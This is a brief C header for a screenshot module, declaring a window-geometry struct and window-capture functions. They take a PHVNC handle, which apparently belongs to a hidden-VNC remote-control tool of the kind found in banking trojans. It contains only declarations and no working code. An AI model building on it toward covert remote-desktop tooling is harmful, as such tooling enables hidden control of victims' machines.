#ifndef SSHOT_H_INCLUDED
#define SSHOT_H_INCLUDED

struct WND_INFO
{
    RECT rcWnd;
    DWORD dwWidth;
    DWORD dwHeight;
    bool bScrollBars;
    RECT rcHScroll;
    RECT rcVScroll;

    PHVNC lpServer;
};

void MakeSShot(PHVNC lpServer);
void DrawWindow(PHVNC lpSever,HWND hWnd,HDC hDCTo,HDC hDCFrom);
BOOL PrintWindowEx(HWND hWnd,HDC hDC,UINT dwFlags);

#endif // SSHOT_H_INCLUDED
